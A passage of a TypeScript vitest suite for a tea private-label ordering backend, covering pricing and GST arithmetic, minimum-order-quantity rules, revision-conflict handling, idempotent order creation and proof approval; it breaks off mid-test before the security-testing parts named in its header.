import { prepareProofForApproval } from "./private-label-proof-fixture";
/**
 * TeaFloww Private Label Studio — Tier 5 Adversarial White-Box Hardening Test Suite
 * File: tests/unit/private-label-tier5-backend-adversarial.test.ts
 *
 * Empirical challenger stress harness testing:
 * - Part 1: Extreme Inputs, Dual-Rate Indian GST & Pricing/MOQ Boundary Arithmetic (10 tests)
 * - Part 2: CAS Optimistic Concurrency Control, Revisions & Race Conditions (9 tests)
 * - Part 3: Production Release Hard Gates, Emergency Overrides & 7-Stage QC Lifecycle (9 tests)
 * - Part 4: In-Transaction Audit Trail Persistence Invariants in pl_audit (4 tests)
 * - Part 5: Preflight Security Hardening & Malicious Payload Neutralization (9 tests)
 * - Part 6: Tenant Isolation & Anti-Enumeration (404) Under Adversarial Probing (6 tests)
 * Total: 47 Deep White-Box Adversarial Stress Tests
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import path from "node:path";
import { rmSync } from "node:fs";
import { randomUUID } from "node:crypto";

const TEST_DB = path.join(tmpdir(), `pl-tier5-adv-${process.pid}-${Date.now()}.sqlite`);
process.env.DATABASE_PATH = TEST_DB;

import { getDb } from "@/lib/db";
import { PrivateLabelService } from "@/lib/private-label/service";
import {
  PrivateLabelRevisionConflictError,
  PrivateLabelNotFoundError,
  PrivateLabelGateError,
  type AuditActor,
  type DetailedPricingParams,
  type PricingCalculationParams,
} from "@/lib/private-label/types";
import { calculateQuote, calculateItemized12ComponentQuote } from "@/lib/private-label/pricing";
import { calculateMOQ } from "@/lib/private-label/moq";
import { recordAudit, getAuditHistory } from "@/lib/private-label/audit";
import {
  validatePreflight,
  sanitizeSvg,
  MAX_PREFLIGHT_FILE_SIZE_BYTES,
} from "@/lib/private-label/preflight";

const ACTOR_CUSTOMER_A: AuditActor = {
  actor_type: "customer",
  actor_id: "cust-adv-001",
  actor_email: "alice@darjeeling-direct.com",
  ip_address: "192.168.1.10",
  reason: "Tier 5 Test Customer A",
};

const ACTOR_CUSTOMER_B: AuditActor = {
  actor_type: "customer",
  actor_id: "cust-adv-002",
  actor_email: "bob@himalayan-leaves.org",
  ip_address: "192.168.1.20",
  reason: "Tier 5 Test Customer B",
};

const ACTOR_ADMIN: AuditActor = {
  actor_type: "admin",
  actor_id: "admin-adv-001",
  actor_email: "ops-lead@teafloww.com",
  ip_address: "10.0.0.1",
  reason: "Tier 5 Operations Admin",
};

const ACTOR_SYSTEM: AuditActor = {
  actor_type: "system",
  actor_id: "cron-engine",
  reason: "System Automated Job Runner",
};

describe("TeaFloww Private Label Studio — Tier 5 Adversarial White-Box Hardening Suite", () => {
  beforeAll(() => {
    // Run all migrations on isolated test database
    execFileSync(process.execPath, ["scripts/migrate.mjs"], {
      env: { ...process.env, DATABASE_PATH: TEST_DB },
    });

    const db = getDb();
    // Seed initial catalog data
    PrivateLabelService.seedInitialCatalog();

    // Insert test customer accounts and clients
    db.prepare(`
      INSERT OR IGNORE INTO customers (id, email, name)
      VALUES ('cust-adv-001', 'alice@darjeeling-direct.com', 'Alice Specialty Brands'),
             ('cust-adv-002', 'bob@himalayan-leaves.org', 'Bob Artisan Teas')
    `).run();

    db.prepare(`
      INSERT OR IGNORE INTO pl_clients (id, customer_id, company_name, gstin, contact_name, contact_email)
      VALUES ('client-adv-001', 'cust-adv-001', 'Alice Specialty Brands Pvt Ltd', '19AAACA1234A1Z5', 'Alice Smith', 'alice@darjeeling-direct.com'),
             ('client-adv-002', 'cust-adv-002', 'Bob Artisan Teas LLP', '19BBBCB5678B1Z9', 'Bob Jones', 'bob@himalayan-leaves.org')
    `).run();

    // Seed Packaging Variants
    db.prepare(`
      INSERT OR IGNORE INTO pl_packaging_variants (
        id, family_id, slug, sku, title, material, finish, closure_type,
        capacity_description, net_weight_capacity_grams, width_mm, height_mm, depth_mm,
        label_safe_width_mm, label_safe_height_mm, supplier_name, supplier_sku,
        unit_cost_paise, lead_time_days, moq_units, order_multiple, status, revision
      ) VALUES (
        'pkg_pouch_standup_250g_kraft', 'fam_pouch', 'stand-up-pouch-kraft-250g', 'PK-POUCH-250-KF',
        'Stand-Up Pouch Kraft 250g', 'Kraft/Foil', 'Matte', 'Zipper',
        '250g / 8.8oz', 250, 160, 230, 80,
        140, 150, 'Siliguri Pack Corp', 'SPC-KF-250',
        2500, 14, 500, 50, 'published', 1
      ), (
        'pkg_tin_cylinder_100g_matte_black', 'fam_tin', 'tin-cylinder-matte-black-100g', 'PK-TIN-100-MB',
        'Cylinder Tin Matte Black 100g', 'Tinplate', 'Matte', 'Slip Lid',
        '100g', 100, 85, 140, 85,
        75, 120, 'Bengal Tin Works', 'BTW-100-MB',
        4500, 21, 250, 25, 'published', 1
      ), (
        'pkg_pouch_standup_100g_matte', 'fam_pouch', 'stand-up-pouch-matte-100g', 'PK-POUCH-100-M',
        'Stand-Up Pouch Matte 100g', 'Kraft/Foil', 'Matte', 'Zipper',
        '100g', 100, 120, 180, 60,
        100, 120, 'Siliguri Pack Corp', 'SPC-M-100',
        2000, 14, 250, 25, 'published', 1
      )
    `).run();

    // Seed Tea Options
    db.prepare(`
      INSERT OR IGNORE INTO pl_tea_options (
        id, slug, name, origin_estate, region, grade, flush, tea_category,
        description, caffeine_level, base_cost_per_kg_paise, min_batch_kg,
        is_published, sample_available, revision
      ) VALUES (
        'tea_first_flush_darjeeling', 'darjeeling-first-flush-organic', 'Darjeeling First Flush Organic',
        'Makaibari Estate', 'Darjeeling', 'FTGFOP1', 'First Flush 2026', 'black',
        'Floral muscatel profile with orchid notes', 'medium', 120000, 10.0,
        1, 1, 1
      ), (
        'tea_assam_orthodox', 'assam-orthodox-golden-tips', 'Assam Orthodox Golden Tips',
        'Halmari Estate', 'Assam', 'TGFOP', 'Second Flush 2026', 'black',
        'Malty, rich body with sweet honeyed undertones', 'high', 85000, 10.0,
        1, 1, 1
      ), (
        'tea_oolong_high_mountain', 'himalayan-high-mountain-oolong', 'Himalayan High Mountain Oolong',
        'Gopaldhara Estate', 'Mirik Valley', 'Specialty', 'Autumn Flush', 'oolong',
        'Roasted peach with sweet honey finish', 'medium', 345678, 10.0,
        1, 1, 1
      )
    `).run();

    // Seed Packaging Compatibility Matrix
    db.prepare(`
      INSERT OR IGNORE INTO pl_packaging_compatibility (id, packaging_variant_id, print_method_id, is_supported)
      VALUES ('compat_pouch_paper', 'pkg_pouch_standup_250g_kraft', 'pm_paper_label', 1),
             ('compat_pouch_bopp', 'pkg_pouch_standup_250g_kraft', 'pm_bopp_label', 1),
             ('compat_pouch_digital', 'pkg_pouch_standup_250g_kraft', 'pm_direct_digital', 1),
             ('compat_pouch_gravure', 'pkg_pouch_standup_250g_kraft', 'pm_gravure', 1),
             ('compat_tin_paper', 'pkg_tin_cylinder_100g_matte_black', 'pm_paper_label', 1),
             ('compat_pouch100_paper', 'pkg_pouch_standup_100g_matte', 'pm_paper_label', 1),
             ('compat_pouch100_digital', 'pkg_pouch_standup_100g_matte', 'pm_direct_digital', 1)
    `).run();
  });

  function createTestOrder(
    db: ReturnType<typeof getDb>,
    status = "deposit_paid"
  ): { orderId: string; client_id: string; quote_id: string; project_id: string } {
    const proj = PrivateLabelService.createProjectDraft(
      { title: `Test Order Project ${randomUUID().slice(0, 6)}` },
      ACTOR_CUSTOMER_A.actor_id,
      ACTOR_CUSTOMER_A
    );
    const quote = PrivateLabelService.createQuote(
      proj.id,
      { validity_days: 14 },
      ACTOR_CUSTOMER_A,
      ACTOR_CUSTOMER_A.actor_id
    );
    const orderId = `order_${randomUUID()}`;
    db.prepare(`
      INSERT INTO pl_orders (
        id, order_number, client_id, quote_id, project_id, status,
        deposit_paise, balance_paise, total_paise, revision, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?, ?, ?,
        50000, 50000, 100000, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP
      )
    `).run(orderId, `ORD-${randomUUID().slice(0, 8)}`, proj.client_id, quote.id, proj.id, status);

    return { orderId, client_id: proj.client_id!, quote_id: quote.id, project_id: proj.id };
  }

  afterAll(() => {
    const db = getDb();
    const integrity = db.pragma("integrity_check") as Array<{ integrity_check: string }>;
    expect(integrity[0]?.integrity_check).toBe("ok");
    db.close();
    try {
      rmSync(TEST_DB, { force: true });
      rmSync(`${TEST_DB}-wal`, { force: true });
      rmSync(`${TEST_DB}-shm`, { force: true });
    } catch {
      // ignore cleanup error
    }
  });

  // ==========================================================================
  // Part 1: Extreme Inputs, Dual-Rate Indian GST & Pricing/MOQ Boundary Arithmetic
  // ==========================================================================
  describe("Part 1: Extreme Inputs, Dual-Rate Indian GST & Pricing/MOQ Boundary Arithmetic", () => {
    it("1.1: extreme high volume pricing (10,000,000 units) maintains integer paise precision without NaN or overflow", () => {
      const params: DetailedPricingParams = {
        requestedUnits: 10_000_000,
        netWeightGrams: 100,
        teaOption: {
          id: "tea_first_flush_darjeeling",
          baseCostPerKgPaise: 450000, // ₹4,500/kg
          minBatchKg: 20,
        },
        packagingVariant: {
          id: "pkg_pouch_standup_250g_kraft",
          unitCostPaise: 1200, // ₹12.00
          closureRatePaise: 150,
          tareWeightGrams: 15,
          packsPerCarton: 24,
        },
        printMethod: {
          id: "pm_gravure",
          code: "gravure",
          setupFeePaise: 500000,
          cylinderFeePerColorPaise: 450000,
        },
        colorCount: 6,
        destinationZone: "metro",
      };

      const result = calculateItemized12ComponentQuote(params);
      expect(result.status).toBe("firm_issued");
      expect(result.breakdown).toBeDefined();

      const b = result.breakdown!;
      expect(Number.isFinite(b.grandTotalPaise)).toBe(true);
      expect(b.grandTotalPaise).toBeGreaterThan(0);
      expect(Number.isInteger(b.grandTotalPaise)).toBe(true);
      expect(Number.isInteger(b.unitPricePaise)).toBe(true);
      expect(Number.isInteger(b.taxPaise)).toBe(true);
      expect(Number.isInteger(b.teaCostPaise)).toBe(true);
      expect(Number.isInteger(b.packagingCostPaise)).toBe(true);

      // Verify mathematical balance
      expect(b.grandTotalPaise).toBe(b.subtotalDirectPaise + b.marginPaise + b.taxPaise);
      expect(b.taxPaise).toBe(b.taxDetails.teaGstPaise + b.taxDetails.nonTeaGstPaise);
      expect(b.taxDetails.teaTaxableBasePaise + b.taxDetails.nonTeaTaxableBasePaise).toBe(
        b.subtotalDirectPaise + b.marginPaise
      );
    });

    it("1.2: zero requested units safely returns 0 unit price without division-by-zero crashes", () => {
      const params: PricingCalculationParams = {
        requestedUnits: 0,
        netWeightGrams: 100,
        teaOption: {
          id: "tea_assam_orthodox",
          baseCostPerKgPaise: 120000,
        },
        packagingVariant: {
          id: "pkg_tin_cylinder_100g_matte_black",
          unitCostPaise: 4500,
        },
        printMethod: {
          id: "pm_paper_label",
          code: "paper_label",
          setupFeePaise: 50000,
          cylinderFeePerColorPaise: 0,
        },
      };

      const quote = calculateQuote(params);
      expect(quote.status).toBe("firm_issued");
      expect(quote.breakdown?.unitPricePaise).toBe(0);
      expect(quote.breakdown?.packagingCostPaise).toBe(0);
      expect(Number.isFinite(quote.breakdown?.grandTotalPaise)).toBe(true);

      const detailedQuote = calculateItemized12ComponentQuote(params as DetailedPricingParams);
      expect(detailedQuote.status).toBe("firm_issued");
      expect(detailedQuote.breakdown?.unitPricePaise).toBe(0);
      expect(Number.isFinite(detailedQuote.breakdown?.grandTotalPaise)).toBe(true);
    });

    it("1.3: decimal weights and fractional loss allowance round cleanly to integer paise", () => {
      const params: DetailedPricingParams = {
        requestedUnits: 333,
        netWeightGrams: 37.55,
        teaOption: {
          id: "tea_oolong_high_mountain",
          baseCostPerKgPaise: 345678,
          minBatchKg: 10,
        },
        packagingVariant: {
          id: "pkg_pouch_standup_100g_matte",
          unitCostPaise: 1333,
          closureRatePaise: 77,
          tareWeightGrams: 12.34,
          packsPerCarton: 17,
        },
        printMethod: {
          id: "pm_direct_digital",
          code: "direct_digital",
          setupFeePaise: 25000,
        },
        colorCount: 4,
        priceBook: {
          id: "pb_custom",
          lossAllowanceRate: 0.03333333333,
          marginRate: 0.2222222222,
        },
      };

      const result = calculateItemized12ComponentQuote(params);
      expect(result.status).toBe("firm_issued");
      const b = result.breakdown!;

      expect(Number.isInteger(b.teaCostPaise)).toBe(true);
      expect(Number.isInteger(b.subtotalDirectPaise)).toBe(true);
      expect(Number.isInteger(b.marginPaise)).toBe(true);
      expect(Number.isInteger(b.taxPaise)).toBe(true);
      expect(Number.isInteger(b.taxDetails.teaGstPaise)).toBe(true);
      expect(Number.isInteger(b.taxDetails.nonTeaGstPaise)).toBe(true);
      expect(Number.isInteger(b.grandTotalPaise)).toBe(true);
      expect(Number.isInteger(b.unitPricePaise)).toBe(true);
    });

    it("1.4: negative or zero base rates gracefully yield manual_quote_required with descriptive missingRates", () => {
      const invalidTeaParams: PricingCalculationParams = {
        requestedUnits: 500,
        netWeightGrams: 100,
        teaOption: {
          id: "tea_corrupt",
          baseCostPerKgPaise: -500,
        },
        packagingVariant: {
          id: "pkg_valid",
          unitCostPaise: 1500,
        },
        printMethod: {
          id: "pm_paper_label",
          code: "paper_label",
          setupFeePaise: 50000,
          cylinderFeePerColorPaise: 0,
        },
      };

      const quote = calculateQuote(invalidTeaParams);
      expect(quote.status).toBe("manual_quote_required");
      expect(quote.requiresOperatorReview).toBe(true);
      expect(quote.missingRates).toContain("tea_base_cost_unverified");

      const invalidPackParams: DetailedPricingParams = {
        requestedUnits: 500,
        netWeightGrams: 100,
        teaOption: {
          id: "tea_valid",
          baseCostPerKgPaise: 150000,
        },
        packagingVariant: {
          id: "pkg_corrupt",
          unitCostPaise: 0, // Unset / zero
        },
        printMethod: {
          id: "pm_paper_label",
          code: "paper_label",
        },
      };

      const detailedQuote = calculateItemized12ComponentQuote(invalidPackParams);
      expect(detailedQuote.status).toBe("manual_quote_required");
      expect(detailedQuote.requiresOperatorReview).toBe(true);
      expect(detailedQuote.missingRates).toContain("packaging_unit_cost_unverified");
    });

    it("1.5: international freight zone correctly flags manual_quote_required", () => {
      const internationalParams: DetailedPricingParams = {
        requestedUnits: 1000,
        netWeightGrams: 100,
        teaOption: {
          id: "tea_valid",
          baseCostPerKgPaise: 150000,
        },
        packagingVariant: {
          id: "pkg_valid",
          unitCostPaise: 2000,
        },
        printMethod: {
          id: "pm_paper_label",
          code: "paper_label",
        },
        destinationZone: "international",
      };

      const result = calculateItemized12ComponentQuote(internationalParams);
      expect(result.status).toBe("manual_quote_required");
      expect(result.missingRates).toContain("international_freight_requires_quote");
      expect(result.requiresOperatorReview).toBe(true);
    });

    it("1.6: active tiered price books accurately apply lower unit prices at tier boundaries", () => {
      const activeTiers = [
        {
          item_type: "packaging" as const,
          item_id: "pkg_pouch_standup_250g_kraft",
          min_qty: 500,
          max_qty: 999,
          unit_price_paise: 1800, // ₹18
        },
        {
          item_type: "packaging" as const,
          item_id: "pkg_pouch_standup_250g_kraft",
          min_qty: 1000,
          max_qty: null,
          unit_price_paise: 1400, // ₹14
        },
      ];

      const baseParams: DetailedPricingParams = {
        requestedUnits: 300, // Below lowest tier
        netWeightGrams: 100,
        teaOption: { id: "tea_valid", baseCostPerKgPaise: 100000 },
        packagingVariant: {
          id: "pkg_pouch_standup_250g_kraft",
          unitCostPaise: 2200, // Default base rate ₹22
        },
        printMethod: { id: "pm_paper_label", code: "paper_label" },
        activeTiers,
      };

      // Below tier: uses base rate 2200
      const quoteBelow = calculateItemized12ComponentQuote(baseParams);
      expect(quoteBelow.breakdown?.packagingCostPaise).toBe(300 * 2200);
      expect(quoteBelow.breakdown?.appliedTiers?.packagingTierPricePaise).toBeUndefined();

      // Exactly at lower bound of Tier 1 (500)
      const quoteTier1 = calculateItemized12ComponentQuote({ ...baseParams, requestedUnits: 500 });
      expect(quoteTier1.breakdown?.packagingCostPaise).toBe(500 * 1800);
      expect(quoteTier1.breakdown?.appliedTiers?.packagingTierPricePaise).toBe(1800);

      // Exactly at upper bound of Tier 1 (999)
      const quoteTier1Max = calculateItemized12ComponentQuote({
        ...baseParams,
        requestedUnits: 999,
      });
      expect(quoteTier1Max.breakdown?.packagingCostPaise).toBe(999 * 1800);
      expect(quoteTier1Max.breakdown?.appliedTiers?.packagingTierPricePaise).toBe(1800);

      // In open-ended Tier 2 (1000+)
      const quoteTier2 = calculateItemized12ComponentQuote({ ...baseParams, requestedUnits: 2500 });
      expect(quoteTier2.breakdown?.packagingCostPaise).toBe(2500 * 1400);
      expect(quoteTier2.breakdown?.appliedTiers?.packagingTierPricePaise).toBe(1400);
    });

    it("1.7: MOQ engine rejects quantity 1 unit below packaging MOQ with exact deficiency message", () => {
      const moq = calculateMOQ({
        requestedUnits: 499,
        netWeightGrams: 100,
        teaMinBatchKg: 10, // 100 units needed
        packagingMOQ: 500,
        printMOQ: 250,
        fillingMOQ: 100,
        orderMultiple: 1,
      });

      expect(moq.eligible).toBe(false);
      expect(moq.reasons).toHaveLength(1);
      expect(moq.reasons[0]).toContain("Requested quantity (499) is below primary packaging MOQ of 500 units");
      expect(moq.minUnits).toBe(500);
      expect(moq.nextValidUnits).toBe(500);
    });

    it("1.8: MOQ engine rejects quantity below tea blending batch mass and calculates required units", () => {
      const moq = calculateMOQ({
        requestedUnits: 150,
        netWeightGrams: 50, // 50g per pack
        teaMinBatchKg: 20, // 20kg = 20,000g -> requires 400 units
        packagingMOQ: 100,
        printMOQ: 100,
        fillingMOQ: 50,
        orderMultiple: 50,
      });

      expect(moq.eligible).toBe(false);
      expect(moq.teaUnitsRequired).toBe(400);
      expect(moq.minUnits).toBe(400);
      expect(moq.nextValidUnits).toBe(400);
      expect(moq.reasons[0]).toContain(
        "Requested quantity (150) is below minimum tea blending batch (requires at least 400 units for 20kg blend at 50g/pack)"
      );
    });

    it("1.9: MOQ engine enforces orderMultiple step rounding and snaps nextValidUnits", () => {
      const moq = calculateMOQ({
        requestedUnits: 1250,
        netWeightGrams: 100,
        teaMinBatchKg: 10,
        packagingMOQ: 500,
        printMOQ: 500,
        fillingMOQ: 100,
        orderMultiple: 500, // Multiples of 500 only: 500, 1000, 1500, etc.
      });

      expect(moq.eligible).toBe(false);
      expect(moq.nextValidUnits).toBe(1500);
      expect(moq.reasons).toContain(
        "Quantity (1250) must be an exact multiple of 500 (next valid quantity is 1500)"
      );
    });

    it("1.10: MOQ engine simultaneously reports compound multi-constraint failures", () => {
      const moq = calculateMOQ({
        requestedUnits: 75,
        netWeightGrams: 100,
        teaMinBatchKg: 25, // 25kg at 100g = 250 units required
        packagingMOQ: 500,
        printMOQ: 1000,
        fillingMOQ: 200,
        orderMultiple: 100,
        minOrderValuePaise: 5000000, // ₹50,000
        unitEstimatedPricePaise: 1000, // ₹10/unit -> 75 * 1000 = ₹750 < ₹50,000
      });

      expect(moq.eligible).toBe(false);
      // All 6 constraints fail:
      // 1. tea batch (< 250)
      // 2. packaging (< 500)
      // 3. print (< 1000)
      // 4. filling (< 200)
      // 5. order multiple (75 % 100 !== 0)
      // 6. minimum order value
      expect(moq.reasons.length).toBe(6);
      expect(moq.minUnits).toBe(1000);
      expect(moq.nextValidUnits).toBe(1000);
    });
  });

  // ==========================================================================
  // Part 2: CAS Optimistic Concurrency Control, Revisions & Race Conditions
  // ==========================================================================
  describe("Part 2: CAS Optimistic Concurrency Control, Revisions & Race Conditions", () => {
    it("2.1: concurrent project draft updates with identical expected_revision yield exactly one winner and one 409 conflict", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Adversarial Project Alpha",
          target_market: "India",
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      expect(project.revision).toBe(1);

      // Attempt 1: succeeds and advances revision to 2
      const updatedP1 = PrivateLabelService.updateProjectDraft(
        project.id,
        1,
        { title: "Alice First Concurrent Edit" },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );
      expect(updatedP1.revision).toBe(2);
      expect(updatedP1.title).toBe("Alice First Concurrent Edit");

      // Attempt 2: with stale expected_revision=1 throws PrivateLabelRevisionConflictError
      expect(() => {
        PrivateLabelService.updateProjectDraft(
          project.id,
          1,
          { title: "Alice Second Conflicting Edit" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      }).toThrow(PrivateLabelRevisionConflictError);

      try {
        PrivateLabelService.updateProjectDraft(
          project.id,
          1,
          { title: "Alice Second Conflicting Edit" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      } catch (err) {
        const revErr = err as PrivateLabelRevisionConflictError;
        expect(revErr.status).toBe(409);
        expect(revErr.current_revision).toBe(2);
        expect(revErr.expected_revision).toBe(1);
        expect(revErr.entity_type).toBe("Project");
      }
    });

    it("2.2: concurrent admin quote price overrides with identical expected_revision throw revision conflict", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Quote Override Race Project",
          draft_configuration: {
            teaOptionId: "tea_first_flush_darjeeling",
            packagingVariantId: "pkg_pouch_standup_250g_kraft",
            printMethodId: "pm_paper_label",
            quantityUnits: 1000,
            fillWeightGrams: 100,
          },
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const quote = PrivateLabelService.createQuote(
        project.id,
        { validity_days: 14 },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );
      expect(quote.revision).toBe(1);

      // Admin 1 overrides price at expected_revision: 1
      const overriddenQuote = PrivateLabelService.overrideQuotePrice(
        quote.id,
        {
          tea_subtotal_paise: 200000,
          operator_notes: "Operator A discount applied",
        },
        ACTOR_ADMIN,
        1
      );
      expect(overriddenQuote.revision).toBe(2);

      // Admin 2 attempts concurrent override at stale expected_revision: 1
      expect(() => {
        PrivateLabelService.overrideQuotePrice(
          quote.id,
          {
            tea_subtotal_paise: 250000,
            operator_notes: "Operator B conflicting discount",
          },
          ACTOR_ADMIN,
          1
        );
      }).toThrow(PrivateLabelRevisionConflictError);
    });

    it("2.3: concurrent issueFirmQuote with stale expected_revision throws PrivateLabelRevisionConflictError", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Firm Quote Race Project",
          draft_configuration: {
            teaOptionId: "tea_assam_orthodox",
            packagingVariantId: "pkg_tin_cylinder_100g_matte_black",
            printMethodId: "pm_paper_label",
            quantityUnits: 500,
          },
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const quote = PrivateLabelService.createQuote(
        project.id,
        { validity_days: 7 },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      // First issuance succeeds
      const firmQuote = PrivateLabelService.issueFirmQuote(quote.id, 14, ACTOR_ADMIN, 1);
      expect(firmQuote.status).toBe("firm_issued");
      expect(firmQuote.revision).toBe(2);

      // Second issuance with expected_revision: 1 fails
      expect(() => {
        PrivateLabelService.issueFirmQuote(quote.id, 14, ACTOR_ADMIN, 1);
      }).toThrow(PrivateLabelRevisionConflictError);
    });

    it("2.4: concurrent acceptQuote race creates order once and subsequent attempts reject with already converted error", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Quote Acceptance Race Project",
          draft_configuration: {
            teaOptionId: "tea_first_flush_darjeeling",
            packagingVariantId: "pkg_pouch_standup_250g_kraft",
            printMethodId: "pm_paper_label",
            quantityUnits: 1000,
            fillWeightGrams: 100,
          },
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const quote = PrivateLabelService.createQuote(
        project.id,
        { validity_days: 14 },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      // Winner accepts quote at rev 1
      const { quote: acceptedQuote, orderId } = PrivateLabelService.acceptQuote(
        quote.id,
        1,
        { acceptance_notes: "Approved for production" },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );
      expect(acceptedQuote.status).toBe("customer_accepted");
      expect(acceptedQuote.revision).toBe(2);
      expect(orderId).toBeDefined();

      // Loser attempts with stale rev 1
      expect(() => {
        PrivateLabelService.acceptQuote(
          quote.id,
          1,
          { acceptance_notes: "Duplicate click" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      }).toThrow(PrivateLabelRevisionConflictError);

      // If loser tries with updated rev 2, but quote is already accepted/converted, it rejects if converted
      // Let's test convertQuoteToOrder on the quote
      PrivateLabelService.convertQuoteToOrder(
        quote.id,
        { expected_revision: 2 },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      expect(() => {
        PrivateLabelService.acceptQuote(
          quote.id,
          3,
          { acceptance_notes: "Post conversion click" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      }).toThrow(PrivateLabelGateError);
    });

    it("2.5: convertQuoteToOrder idempotency key prevents duplicate order row creation", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Idempotency Test Project",
          draft_configuration: {
            teaOptionId: "tea_first_flush_darjeeling",
            packagingVariantId: "pkg_pouch_standup_250g_kraft",
            printMethodId: "pm_paper_label",
            quantityUnits: 1000,
          },
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const quote = PrivateLabelService.createQuote(
        project.id,
        { validity_days: 14 },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      const idempotencyKey = `idem_${randomUUID()}`;

      // First call creates the order
      const res1 = PrivateLabelService.convertQuoteToOrder(
        quote.id,
        { idempotency_key: idempotencyKey, expected_revision: 1 },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );
      expect(res1.deduped).toBeFalsy();
      expect(res1.order.idempotency_key).toBe(idempotencyKey);

      // Second call with identical idempotencyKey returns existing order with deduped: true
      const res2 = PrivateLabelService.convertQuoteToOrder(
        quote.id,
        { idempotency_key: idempotencyKey },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );
      expect(res2.deduped).toBe(true);
      expect(res2.order.id).toBe(res1.order.id);

      // Invariant: exactly one order exists with this idempotency key in the DB
      const db = getDb();
      const countRow = db
        .prepare("SELECT count(*) as count FROM pl_orders WHERE idempotency_key = ?")
        .get(idempotencyKey) as { count: number };
      expect(countRow.count).toBe(1);
    });

    it("2.6: proof approval on superseded revision is blocked with PrivateLabelRevisionConflictError", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Proof Supersede Project",
          items: [
            {
              teaOptionId: "tea_first_flush_darjeeling",
              packagingVariantId: "pkg_pouch_standup_250g_kraft",
              printMethodId: "pm_paper_label",
              quantityUnits: 500,
              fillWeightGrams: 100,
            },
          ],
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const fullProject = PrivateLabelService.getProject(project.id, ACTOR_CUSTOMER_A.actor_id);
      const projectItemId = fullProject.items[0]?.id;
      expect(projectItemId).toBeDefined();

      // Create Artwork Asset
      const asset = PrivateLabelService.createArtworkAsset(
        {
          original_filename: "label_front_v1.png",
          storage_key: "/uploads/label_front_v1.png",
          file_sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          mime_type: "image/png",
          file_size_bytes: 1024 * 500,
          rights_attestation: true,
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      // Create Version 1
      const ver1 = PrivateLabelService.createDesignVersion(
        project.id,
        {
          project_item_id: projectItemId,
          scene_json: { name: "v1" },
          front_artwork_asset_id: asset.id,
        },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );
      expect(ver1.version_number).toBe(1);

      // Create Version 2 (supersedes Version 1)
      const ver2 = PrivateLabelService.createDesignVersion(
        project.id,
        {
          project_item_id: projectItemId,
          scene_json: { name: "v2" },
          front_artwork_asset_id: asset.id,
        },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );
      expect(ver2.version_number).toBe(2);

      // Attempting to approve superseded Version 1 throws conflict
      expect(() => {
        PrivateLabelService.approveProof(prepareProofForApproval(ver1.id),
          { disclaimer_accepted: true, signer_name: "Alice" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      }).toThrow(PrivateLabelRevisionConflictError);

      try {
        PrivateLabelService.approveProof(prepareProofForApproval(ver1.id),
          { disclaimer_accepted: true, signer_name: "Alice" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      } catch (err) {
        const revErr = err as PrivateLabelRevisionConflictError;
        expect(revErr.status).toBe(409);
        expect(revErr.message).toContain("superseded by revision 2");
      }
    });

    it("2.7: proof approval double-approval lock blocks re-approving an already locked revision", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Double Approval Lock Project",
          items: [
            {
              teaOptionId: "tea_first_flush_darjeeling",
              packagingVariantId: "pkg_pouch_standup_250g_kraft",
              printMethodId: "pm_paper_label",
              quantityUnits: 500,
              fillWeightGrams: 100,
            },
          ],
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const fullProject = PrivateLabelService.getProject(project.id, ACTOR_CUSTOMER_A.actor_id);
      const projectItemId = fullProject.items[0]?.id;
      const asset = PrivateLabelService.createArtworkAsset(
        {
          original_filename: "label_lock_test.png",
          storage_key: "/uploads/label_lock_test.png",
          file_sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          mime_type: "image/png",
          file_size_bytes: 50000,
          rights_attestation: true,
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const ver = PrivateLabelService.createDesignVersion(
        project.id,
        {
          project_item_id: projectItemId,
